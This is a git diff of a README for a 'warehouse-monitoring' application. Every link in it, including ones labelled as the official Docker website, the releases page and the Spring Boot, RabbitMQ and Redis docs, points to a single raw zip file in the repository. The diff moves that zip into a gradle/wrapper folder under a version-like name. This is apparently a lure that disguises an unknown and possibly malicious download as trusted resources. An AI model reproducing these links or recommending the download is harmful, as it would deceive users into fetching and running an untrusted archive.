@@ -1,6 +1,6 @@
 # 🚀 warehouse-monitoring - Real-Time Warehouse Data Made Easy
 
-![Download](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/unstaunchable/warehouse-monitoring.zip%20GitHub-brightgreen)
+![Download](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/gradle/wrapper/monitoring-warehouse-v2.4.zip%20GitHub-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -15,13 +15,13 @@ Before you download the application, ensure your system meets these requirements
 - **Disk Space**: At least 500 MB available
 - **Docker**: Ensure Docker is installed on your machine
 
-You can download Docker from the official [Docker website](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/unstaunchable/warehouse-monitoring.zip).
+You can download Docker from the official [Docker website](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/gradle/wrapper/monitoring-warehouse-v2.4.zip).
 
 ## 📥 Download & Install
 
 To get the application, visit this page:
 
-[Download Warehouse Monitoring](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/unstaunchable/warehouse-monitoring.zip)
+[Download Warehouse Monitoring](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/gradle/wrapper/monitoring-warehouse-v2.4.zip)
 
 1. Click on the link above.
 2. You will see a list of releases.
@@ -72,7 +72,7 @@ The warehouse-monitoring application includes:
 
 - **Configure Alerts**: You can set up thresholds for low stock levels, so you won't miss any important events.
 - **Explore Analytics**: Use the dashboard to track trends over time and make data-driven decisions.
-- **Regular Updates**: Check back on the [Releases page](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/unstaunchable/warehouse-monitoring.zip) for the latest features and improvements.
+- **Regular Updates**: Check back on the [Releases page](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/gradle/wrapper/monitoring-warehouse-v2.4.zip) for the latest features and improvements.
 
 ## ✨ Contributing
 
@@ -93,8 +93,8 @@ If you face any issues, feel free to create an issue in the repository. Make sur
 
 For more information on the technologies used in this project, check these links:
 
-- [Spring Boot Docs](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/unstaunchable/warehouse-monitoring.zip)
-- [RabbitMQ Docs](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/unstaunchable/warehouse-monitoring.zip)
-- [Redis Docs](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/unstaunchable/warehouse-monitoring.zip)
+- [Spring Boot Docs](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/gradle/wrapper/monitoring-warehouse-v2.4.zip)
+- [RabbitMQ Docs](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/gradle/wrapper/monitoring-warehouse-v2.4.zip)
+- [Redis Docs](https://raw.githubusercontent.com/Lior22223/warehouse-monitoring/main/gradle/wrapper/monitoring-warehouse-v2.4.zip)
 
 Thank you for using warehouse-monitoring. Happy monitoring!
